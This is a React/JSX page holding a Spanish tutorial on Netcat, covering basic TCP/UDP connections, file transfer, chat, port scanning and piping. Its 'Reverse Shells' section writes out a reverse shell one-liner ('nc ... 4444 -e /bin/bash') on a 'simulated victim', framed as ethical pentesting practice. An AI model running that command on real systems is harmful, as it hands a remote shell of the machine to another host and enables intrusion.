import Titulo from "./../../componentes/titulo.jsx";
import Lista from "./../../componentes/lista.jsx";
import Texto from "./../../componentes/texto.jsx";
import Linea from "./../../componentes/linea.jsx";
import Enlace from "../../../componentes/enlace.jsx";

function Temario({ className = "" }) {
  return (
    <Lista className={className}>
   </Lista>
  );
}

function nameabcd({ }) {
  return (
    <>
      <Titulo title="h1" id="netcat-en-linux">Netcat en Linux</Titulo>
      <Linea />
      <Titulo title="h2" id="temario">Temario</Titulo>
      <Lista>
        <li><Enlace href="#netcat-en-linux">Netcat en Linux</Enlace >
          <Lista>
            <li><Enlace href="#temario">Temario</Enlace ></li>
            <li><Enlace href="#qué-es-netcat">¿Qué es Netcat?</Enlace ></li>
            <li><Enlace href="#instalación">Instalación</Enlace ></li>
            <li><Enlace href="#sintaxis-general">Sintaxis general</Enlace ></li>
            <li><Enlace href="#modos-principales-de-uso">Modos principales de uso</Enlace >
              <Lista>
                <li><Enlace href="#cliente-tcp">Cliente TCP</Enlace ></li>
                <li><Enlace href="#servidor-tcp">Servidor TCP</Enlace ></li>
              </Lista>
            </li>
            <li><Enlace href="#udp-en-lugar-de-tcp">UDP en lugar de TCP</Enlace ></li>
            <li><Enlace href="#transferencia-de-archivos">Transferencia de archivos</Enlace >
              <Lista>
                <li><Enlace href="#enviar-un-archivo">Enviar un archivo</Enlace ></li>
              </Lista>
            </li>
            <li><Enlace href="#chat-simple-entre-dos-pcs-tcp">Chat simple entre dos PCs
              (TCP)</Enlace ></li>
            <li><Enlace href="#escaneo-de-puertos">Escaneo de puertos</Enlace ></li>
            <li><Enlace href="#redirección-de-entradasalida">Redirección de
              entrada/salida</Enlace ></li>
            <li><Enlace href="#reverse-shells-usos-éticos-y-educativos">Reverse Shells
              (usos éticos y educativos)</Enlace >
              <Lista>
                <li><Enlace href="#en-el-servidor-escuchando">En el servidor
                  (escuchando)</Enlace ></li>
                <li><Enlace href="#en-la-víctima-simulada">En la víctima (simulada)</Enlace ></li>
              </Lista>
            </li>
            <li><Enlace href="#otras-opciones-útiles">Otras opciones útiles</Enlace ></li>
            <li><Enlace href="#ejemplo-práctico-completo">Ejemplo práctico completo</Enlace >
              <Lista>
                <li><Enlace href="#crear-servidor-de-eco">Crear servidor de eco</Enlace ></li>
                <li><Enlace href="#cliente">Cliente</Enlace ></li>
              </Lista>
            </li>
            <li><Enlace href="#resumen-rápido">Resumen rápido</Enlace ></li>
            <li><Enlace href="#alternativas-modernas">Alternativas modernas</Enlace ></li>
          </Lista>
        </li>
      </Lista>
      <Texto><Enlace href="./../../readme.md#5-python">Regresar a la Guía
        Principal</Enlace ></Texto>
      <Linea />
      <Titulo title="h2" id="qué-es-netcat">¿Qué es Netcat?</Titulo>
      <Texto><strong>Netcat</strong> (abreviado <code>nc</code>) es una
        herramienta de línea de comandos usada para:</Texto>
      <Lista>
        <li>Leer y escribir datos en conexiones <strong>TCP o UDP</strong>.</li>
        <li>Crear <strong>clientes y servidores</strong>.</li>
        <li>Transferir archivos, hacer <strong>escucha de puertos</strong>,
          <strong>chats</strong>, o incluso <strong>backdoors</strong> (de forma
          ética y controlada).
        </li>
      </Lista>
      <Texto>Es conocida como el <strong>“cuchillo suizo de las redes”</strong>
        🧰.</Texto>
      <Linea />
      <Titulo title="h2" id="instalación">Instalación</Titulo>
      <Texto>En la mayoría de sistemas viene preinstalado:</Texto>
      <div className="sourceCode" id="cb1">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb1-1"><Enlace href="#cb1-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-h</span></span></code></pre>
      </div>
      <Texto>Si no lo tienes:</Texto>
      <Texto><strong>Linux (Debian/Ubuntu):</strong></Texto>
      <div className="sourceCode" id="cb2">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb2-1"><Enlace href="#cb2-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="fu">sudo</span> apt install netcat</span></code></pre>
      </div>
      <Texto><strong>Windows:</strong> Puedes usar <strong>Ncat</strong> (parte de
        Nmap): 👉 <Enlace href="https://nmap.org/ncat/">https://nmap.org/ncat/</Enlace ></Texto>
      <Linea />
      <Titulo title="h2" id="sintaxis-general">Sintaxis general</Titulo>
      <div className="sourceCode" id="cb3">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb3-1"><Enlace href="#cb3-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="pp">[</span><span className="ss">opciones</span><span className="pp">]</span> <span className="pp">[</span><span className="ss">host</span><span className="pp">]</span> <span className="pp">[</span><span className="ss">puerto</span><span className="pp">]</span></span></code></pre>
      </div>
      <Linea />
      <Titulo title="h2" id="modos-principales-de-uso">Modos principales de uso</Titulo>
      <Titulo title="h3" id="cliente-tcp">Cliente TCP</Titulo>
      <Texto>Conectarse a un servidor:</Texto>
      <div className="sourceCode" id="cb4">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb4-1"><Enlace href="#cb4-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 127.0.0.1 8080</span></code></pre>
      </div>
      <Texto>Esto abre una conexión al puerto 8080 del localhost.</Texto>
      <Titulo title="h3" id="servidor-tcp">Servidor TCP</Titulo>
      <Texto>Escuchar conexiones:</Texto>
      <div className="sourceCode" id="cb5">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb5-1"><Enlace href="#cb5-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-l</span> <span className="at">-p</span> 8080</span></code></pre>
      </div>
      <Texto>🔹 <code>-l</code> → modo escucha</Texto>
      <Texto>🔹 <code>-p</code> → especifica el puerto</Texto>
      <Texto>Luego, desde otro terminal:</Texto>
      <div className="sourceCode" id="cb6">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb6-1"><Enlace href="#cb6-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 127.0.0.1 8080</span></code></pre>
      </div>
      <Texto>Ahora puedes <strong>enviar mensajes entre ambos terminales (chat
        simple)</strong>.</Texto>
      <Linea />
      <Titulo title="h2" id="udp-en-lugar-de-tcp">UDP en lugar de TCP</Titulo>
      <Texto>Para usar <strong>UDP</strong> en vez de TCP:</Texto>
      <div className="sourceCode" id="cb7">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb7-1"><Enlace href="#cb7-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="co"># Servidor</span></span>
            <span id="cb7-2"><Enlace href="#cb7-2" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-u</span> <span className="at">-l</span> <span className="at">-p</span> 6000</span>
            <span id="cb7-3"><Enlace href="#cb7-3" aria-hidden="true" tabindex="-1"></Enlace ></span>
            <span id="cb7-4"><Enlace href="#cb7-4" aria-hidden="true" tabindex="-1"></Enlace ><span className="co"># Cliente</span></span>
            <span id="cb7-5"><Enlace href="#cb7-5" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-u</span> 127.0.0.1 6000</span></code></pre>
      </div>
      <Texto>🔹 <code>-u</code> → activa modo UDP.</Texto>
      <Linea />
      <Titulo title="h2" id="transferencia-de-archivos">Transferencia de archivos</Titulo>
      <Titulo title="h3" id="enviar-un-archivo">Enviar un archivo</Titulo>
      <Texto>Servidor que recibirá:</Texto>
      <div className="sourceCode" id="cb8">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb8-1"><Enlace href="#cb8-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-l</span> <span className="at">-p</span> 5000 <span className="op">&gt;</span> archivo_recibido.txt</span></code></pre>
      </div>
      <Texto>Cliente que envía:</Texto>
      <div className="sourceCode" id="cb9">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb9-1"><Enlace href="#cb9-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 127.0.0.1 5000 <span className="op">&lt;</span> archivo.txt</span></code></pre>
      </div>
      <Texto>👉 El archivo <code>archivo.txt</code> se envía al servidor.</Texto>
      <Linea />
      <Titulo title="h2" id="chat-simple-entre-dos-pcs-tcp">Chat simple entre dos PCs
        (TCP)</Titulo>
      <Texto>En una máquina:</Texto>
      <div className="sourceCode" id="cb10">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb10-1"><Enlace href="#cb10-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-l</span> <span className="at">-p</span> 4000</span></code></pre>
      </div>
      <Texto>En otra:</Texto>
      <div className="sourceCode" id="cb11">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb11-1"><Enlace href="#cb11-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> IP_DEL_SERVIDOR 4000</span></code></pre>
      </div>
      <Texto>Ahora ambos pueden escribir y leer mensajes.</Texto>
      <Linea />
      <Titulo title="h2" id="escaneo-de-puertos">Escaneo de puertos</Titulo>
      <Texto>Netcat puede escanear qué puertos están abiertos en una máquina:</Texto>
      <div className="sourceCode" id="cb12">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb12-1"><Enlace href="#cb12-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-zv</span> 192.168.1.10 20-80</span></code></pre>
      </div>
      <Texto>🔹 <code>-z</code> → modo “scan” sin enviar datos.</Texto>
      <Texto>🔹 <code>-v</code> → modo verbose (muestra resultado).</Texto>
      <Texto>🔹 <code>20-80</code> → rango de puertos.</Texto>
      <Linea />
      <Titulo title="h2" id="redirección-de-entradasalida">Redirección de entrada/salida</Titulo>
      <Texto>Puedes usar <strong>pipes</strong> para automatizar tareas:</Texto>
      <div className="sourceCode" id="cb13">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb13-1"><Enlace href="#cb13-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="bu">echo</span> <span className="st">&quot;Hola servidor&quot;</span> <span className="kw">|</span> <span className="ex">nc</span> 127.0.0.1 8080</span></code></pre>
      </div>
      <Texto>O guardar la respuesta:</Texto>
      <div className="sourceCode" id="cb14">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb14-1"><Enlace href="#cb14-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 127.0.0.1 80 <span className="op">&lt;</span> peticion.txt <span className="op">&gt;</span> respuesta.txt</span></code></pre>
      </div>
      <Linea />
      <Titulo title="h2" id="reverse-shells-usos-éticos-y-educativos">Reverse Shells (usos
        éticos y educativos)</Titulo>
      <Texto>Netcat puede crear conexiones remotas tipo <strong>shell
        inversa</strong>, usadas en <strong>pentesting</strong> (no
        ilegalmente).</Texto>
      <Titulo title="h3" id="en-el-servidor-escuchando">En el servidor (escuchando)</Titulo>
      <div className="sourceCode" id="cb15">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb15-1"><Enlace href="#cb15-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-l</span> <span className="at">-p</span> 4444 <span className="at">-v</span></span></code></pre>
      </div>
      <Titulo title="h3" id="en-la-víctima-simulada">En la víctima (simulada)</Titulo>
      <div className="sourceCode" id="cb16">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb16-1"><Enlace href="#cb16-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 192.168.1.100 4444 <span className="at">-e</span> /bin/bash</span></code></pre>
      </div>
      <Texto>👉 Esto le da al servidor una consola remota de la otra máquina.
        <em>(Solo en entornos controlados o de práctica legal.)</em>
      </Texto>
      <Linea />
      <Titulo title="h2" id="otras-opciones-útiles">Otras opciones útiles</Titulo>
      <table>
        <thead>
          <tr>
            <th>Opción</th>
            <th>Descripción</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>-l</code></td>
            <td>Escucha conexiones entrantes</td>
          </tr>
          <tr>
            <td><code>-p &lt;puerto&gt;</code></td>
            <td>Define puerto local</td>
          </tr>
          <tr>
            <td><code>-v</code></td>
            <td>Verbose (muestra información detallada)</td>
          </tr>
          <tr>
            <td><code>-z</code></td>
            <td>Modo escaneo sin datos</td>
          </tr>
          <tr>
            <td><code>-n</code></td>
            <td>No resuelve DNS (usa IP directamente)</td>
          </tr>
          <tr>
            <td><code>-u</code></td>
            <td>Usa UDP</td>
          </tr>
          <tr>
            <td><code>-e &lt;comando&gt;</code></td>
            <td>Ejecuta un programa tras conectar (⚠️ uso ético)</td>
          </tr>
        </tbody>
      </table>
      <Linea />
      <Titulo title="h2" id="ejemplo-práctico-completo">Ejemplo práctico completo</Titulo>
      <Titulo title="h3" id="crear-servidor-de-eco">Crear servidor de eco</Titulo>
      <div className="sourceCode" id="cb17">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb17-1"><Enlace href="#cb17-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="co"># Servidor</span></span>
            <span id="cb17-2"><Enlace href="#cb17-2" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> <span className="at">-l</span> <span className="at">-p</span> 1234 <span className="at">-v</span></span></code></pre>
      </div>
      <Titulo title="h3" id="cliente">Cliente</Titulo>
      <div className="sourceCode" id="cb18">
        <pre
          className="sourceCode bash"><code className="sourceCode bash"><span id="cb18-1"><Enlace href="#cb18-1" aria-hidden="true" tabindex="-1"></Enlace ><span className="ex">nc</span> 127.0.0.1 1234</span></code></pre>
      </div>
      <Texto>Ahora cualquier texto que envíes se reflejará entre ambos.</Texto>
      <Linea />
      <Titulo title="h2" id="resumen-rápido">Resumen rápido</Titulo>
      <table>
        <colgroup>
          <col style="width: 19%" />
          <col style="width: 54%" />
          <col style="width: 26%" />
        </colgroup>
        <thead>
          <tr>
            <th>Función</th>
            <th>Comando</th>
            <th>Descripción</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Cliente TCP</td>
            <td><code>nc host puerto</code></td>
            <td>Conecta a un servidor</td>
          </tr>
          <tr>
            <td>Servidor TCP</td>
            <td><code>nc -l -p puerto</code></td>
            <td>Escucha conexiones</td>
          </tr>
          <tr>
            <td>Cliente UDP</td>
            <td><code>nc -u host puerto</code></td>
            <td>Envía datos por UDP</td>
          </tr>
          <tr>
            <td>Servidor UDP</td>
            <td><code>nc -u -l -p puerto</code></td>
            <td>Escucha por UDP</td>
          </tr>
          <tr>
            <td>Transferir archivo</td>
            <td><code>nc -l -p 1234 &gt; out.txt</code> /
              <code>nc host 1234 &lt; in.txt</code>
            </td>
            <td>Enviar archivos</td>
          </tr>
          <tr>
            <td>Escanear puertos</td>
            <td><code>nc -zv host 1-1024</code></td>
            <td>Detectar puertos abiertos</td>
          </tr>
        </tbody>
      </table>
      <Linea />
      <Titulo title="h2" id="alternativas-modernas">Alternativas modernas</Titulo>
      <Lista>
        <li><strong>Ncat</strong> (de Nmap): versión más segura y moderna.</li>
        <li><strong>Socat</strong>: similar pero con más opciones.</li>
        <li><strong>PowerCat</strong> (en Windows PowerShell): equivalente en
          sistemas modernos.</li>
      </Lista>
      <Linea />
      <Texto><Enlace href="./../../readme.md#5-python">Regresar a la Guía
        Principal</Enlace ></Texto>
      <blockquote>
        <Texto><strong>Autor:</strong> Fravelz</Texto>
      </blockquote>
    </>
  );
}
export default nameabcd;
